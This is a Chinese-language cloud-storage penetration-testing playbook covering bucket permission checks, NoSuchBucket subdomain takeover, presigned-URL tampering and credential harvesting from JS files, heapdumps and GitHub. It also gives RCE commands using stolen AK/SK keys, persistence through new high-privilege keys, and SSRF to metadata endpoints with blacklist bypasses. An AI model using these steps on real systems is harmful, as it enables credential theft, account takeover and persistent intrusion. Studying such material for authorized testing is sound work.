# OSS/Bucket 完整攻击链 — 云存储安全测试

> 覆盖 AliCloud OSS / AWS S3 / Tencent COS / Huawei OBS / Google GCS / Azure Blob / Qiniu Kodo
> 从 Bucket 权限测试 → NoSuchBucket 域名接管 → AK/SK 凭据利用 → 云环境命令执行

---

## 1. 识别信号

```
URL 含云存储域名:
  *.oss-cn-*.aliyuncs.com / *.oss.aliyuncs.com     → Alibaba OSS
  *.s3.amazonaws.com / *.s3-*.amazonaws.com         → AWS S3
  *.cos.ap-*.myqcloud.com / *.cos.*.myqcloud.com    → Tencent COS
  *.obs.cn-*.myhuaweicloud.com                       → Huawei OBS
  *.storage.googleapis.com                            → Google GCS
  *.blob.core.windows.net                             → Azure Blob
  *.qiniucdn.com / *.qiniu.com                        → Qiniu Kodo

JS 中引用:
  new OSS({...}) / new AWS.S3({...}) / new COS({...})
  bucket: / oss: / s3: / cos: / cdn.

错误响应:
  "NoSuchBucket" / "AccessDenied" / "BucketName" XML/JSON
  "The specified bucket does not exist"

API 响应含预签名 URL:
  ?Expires= / ?Signature= / ?OSSAccessKeyId= / X-Amz-Credential=
```

---

## 2. Bucket 权限测试

```
Step 1: Public Read 测试
  → 直接用浏览器/curl访问文件URL(无认证)
  → 200且返回文件内容 → 公开可读
  → AccessDenied XML → 私有

Step 2: ListObjects 测试
  → GET bucket 根 URL
  → 返回 XML/JSON 文件列表 → 目录可枚举 ✅
  → AccessDenied → 列表已禁用

Step 3: Public Write 测试
  → PUT 一个测试文件到 bucket
  → 200 → bucket 可公开写 → Bucket Takeover ✅
     (如果域名绑定到此Bucket,可上传HTML做钓鱼)
  → 403 → 写入禁用
```

---

## 3. NoSuchBucket 域名接管 ★★★

```
原理: 目标子域名 CNAME 指向云存储,但原 Bucket 已被删除或未创建。
在新账号下用相同名称+Region创建Bucket → 接管子域名。

Step 1: 识别绑定
  ① ping target-subdomain.target.com → 返回 *.oss-cn-shanghai.aliyuncs.com
  ② 或 dig CNAME target-subdomain.target.com

Step 2: 确认 NoSuchBucket
  ① curl -I https://target-subdomain.target.com
  ② 响应: "NoSuchBucket" / "The specified bucket does not exist"
  → Bucket不存在,但CNAME解析仍在 ✅

Step 3: 提取信息
  ① 从CNAME提取: bucket_name + region
     例: ztk.oss-cn-shanghai.aliyuncs.com
     → bucket_name=ztk, region=oss-cn-shanghai (cn-shanghai)
  ② Bucket 名称在各厂商内全局唯一(同Region)

Step 4: 创建同名 Bucket
  ① 用自己的云账号,在同Region创建同名Bucket
  ② 上传 proof.html (含 "Security Test — {date}")
  ③ 通过原域名访问验证: https://target-subdomain.target.com/proof.html

→ 200 OK → 域名接管确认 ✅
```

### 云厂商 CNAME 指纹

| Provider | CNAME Pattern | Bucket Takeover |
|----------|--------------|-----------------|
| Alibaba OSS | `*.oss-cn-{region}.aliyuncs.com` | ✅ 同名+同Region |
| AWS S3 | `*.s3.amazonaws.com` / `*.s3-{region}.amazonaws.com` | ✅ 同名+同Region |
| Tencent COS | `*.cos.ap-{region}.myqcloud.com` | ✅ 同名+同Region |
| Huawei OBS | `*.obs.cn-{region}.myhuaweicloud.com` | ✅ 同名+同Region |
| Google GCS | `*.storage.googleapis.com` | ❌ 需验证域名所有权 |
| Azure Blob | `*.blob.core.windows.net` | ❌ 需验证域名所有权 |
| Qiniu Kodo | `*.qiniucdn.com` | ⚠️ 部分支持 |

---

## 4. 预签名 URL 深度分析

```
预签名 URL 特征:
  ?Expires=1735689600&OSSAccessKeyId=LTAI...&Signature=...
  ?X-Amz-Expires=3600&X-Amz-Credential=AKIA...&X-Amz-Signature=...

测试方法:
  ① 过期时间检查: Expires 是否过长(>1天)?
     → Replay 旧URL → 绕过时间限制

  ② 签名算法暴露: JS中是否有签名计算逻辑?
     → 提取 signing key → 自行生成任意预签名URL

  ③ Path Traversal: URL中路径部分可修改?
     → /files/report.pdf → /files/../config/.env (保持签名不变)

  ④ 完全去签名: 直接去掉 ?Signature=... 参数
     → 测试无认证访问
```

---

## 5. AK/SK 凭据利用

### 格式识别

```
Alibaba: AKID=LTAI... (24 chars) | SK=30 chars
AWS:     AKID=AKIA... (20 chars) | SK=40 chars
Tencent: AKID=AKID... (36 chars) | SK=32 chars
Huawei:  AKID=VM... (20 chars)   | SK=40 chars
Google:  JSON service account key file
Qiniu:   AK=随机(variable)       | SK=随机(variable)
```

### 泄露来源 (按搜索优先级)

```
1. JS 文件: grep "accessKeyId\|secretAccessKey\|access_key\|secret_key"
2. Heapdump: Spring Actuator /heapdump → extract → grep keys
3. Nacos config: /nacos/v1/cs/configs → search AK/SK
4. 小程序源码: decompile .wxapkg → search cloud SDK init
5. GitHub/Gitee: search "LTAI" OR "AKIA" OR "AKID" + company/domain
6. API 错误响应: 参数异常可能返回AK在错误信息中
7. 上传接口响应: response 中可能包含AK/SK用于直传
```

### 利用链 (拿到AK/SK后)

```
Step 1: 验证有效性
  # Alibaba
  aliyun sts GetCallerIdentity
  # AWS
  aws sts get-caller-identity
  # Tencent
  tccli sts GetCallerIdentity

Step 2: 存储权限利用
  → list-buckets / list-objects → 枚举所有可访问的存储桶
  → get-object → 下载文件,搜索 .env/backup.sql/credentials.csv/*.pem
  → put-object → 上传 proof 文件(验证写权限)

Step 3: 升级到 RCE (如有计算权限)
  Alibaba: 检查 ECS → aliyun ecs RunCommand → 执行命令
  AWS:     检查 SSM + EC2 → aws ssm send-command
  Tencent: 检查 CVM + Tat → tccli tat RunCommand
  Huawei:  检查 ECS → (有限:无直接RCE API)

Step 4: 权限维持 (如有IAM/RAM权限)
  → 创建高权限子账号/访问密钥
  → 绑定到高权限策略
```

---

## 6. Bucket 命名枚举

```
常见 Bucket 命名模式:
  {company}-assets     {company}-uploads     {company}-backup
  {company}-dev        {company}-static      {company}-cdn
  {app}-production     {app}-staging         {app}-development
  {company}-public     {company}-files       {company}-data
  {company}-logs       {company}-private     {company}-img

常见敏感文件:
  .env  backup.zip  database.sql  config.json  credentials.csv
  *.pem  *.p12  id_rsa  known_hosts  accesskey*.txt  *.log
```

---

## 7. 集成到标准工作流

```
Phase 1 Recon:
  □ JS 文件 grep: "oss" "s3" "cos" "bucket" "aliyuncs" "amazonaws" "qiniu"
  □ 所有静态资源 URL 收集,识别云存储域名
  □ 雪瞳提取: cloud_keys 字段自动捕获 AK/SK

Phase 1 Source Leak:
  □ GitHub/Gitee search: "LTAI" OR "AKIA" OR "AKID" + 公司域名

Phase 2 API Fuzz:
  □ 检查上传接口响应是否返回 AK/SK 或预签名 URL
  □ 检查配置接口是否返回云存储配置

Phase 4 Exploit:
  □ 获得 AK/SK → 参考 §5 利用链
  □ 发现 NoSuchBucket → 参考 §3 域名接管
```

---

*End of cloud-attack-surface.md*

## 8. 云元数据服务 (SSRF → 元数据 → 临时凭证 → 接管)

> 来源: 2026-08 实战众测报告(小程序 userAvatar SSRF → 腾讯云元数据 → CAM STS 泄露), 详见 knowledge/experience/ssrf.md 案例2

### 腾讯云 CVM/EKS 元数据
- 端点: `http://metadata.tencentyun.com`(**非** 169.254.169.254; 仅云主机内网可达——SSRF 能拉到 = 后端在腾讯云上)
- 根目录: `1.0/` `2017-09-19/` `latest/` `meta-data/`
- **CAM 角色临时凭证**: `http://metadata.tencentyun.com/meta-data/cam/role-security-credentials/<角色名>`
  → 返回 `{"TmpSecretId":"AKID...","TmpSecretKey":"...","TmpToken":"..."}`(角色名常见 TKE_QCSLinkedRoleIn* 形态, 顺带泄露基础设施信息)
- **实战验证端点清单**(荣耀低代码 SSRF 案例): `/latest/meta-data/public-keys/0/openssh-key`(SSH公钥) /
  `/latest/meta-data/volumes`(实例存储) / `/latest/meta-data/instance-name`(实例名) / `/latest/meta-data/local-ipv4`(内网IP)
- **短链绕过黑名单**: SSRF 防护拦云厂商域名/IP 时, 用第三方短链服务(dzxf119.cn 类)把元数据 URL 转短链 →
  短链域名不在黑名单 → 服务端代理请求短链 → 302 → 元数据。同族: 重定向跳转/十进制 IP/DNS rebinding

### Store-and-Read SSRF(把盲打变回显的实战技巧)
特征功能组合: **用户提交 URL(头像/水印/导入) → 服务端拉取 → 拉取结果存储 → 存储路径可公开访问(CDN/OSS)**
```
1. userAvatar 改为元数据地址(或任意内网 URL)
2. 服务端拉取后存储 → 响应回显 CDN 存储路径(如 user_avatar/<随机>.jpg)
3. GET cdn域名/user_avatar/<随机>.jpg → 读到 SSRF 拉取的内容(含内网响应)
```

### 适用信号
- 登录/资料请求含 userAvatar/avatarUrl/url 等服务端会拉取的字段
- 响应头 Server: tencent-ci / x-cos-request-id / CDN 路径形态 → 腾讯云 COS/CI 后端
- 阿里云对应: 100.100.100.200/meta-data/; AWS: 169.254.169.254/latest/meta-data/

### 合规红线
拿到 TmpSecretId/TmpToken 即停并报告(证明可达即可), **禁止实际调用云 API、禁止读取 COS 数据**(TIER 3)
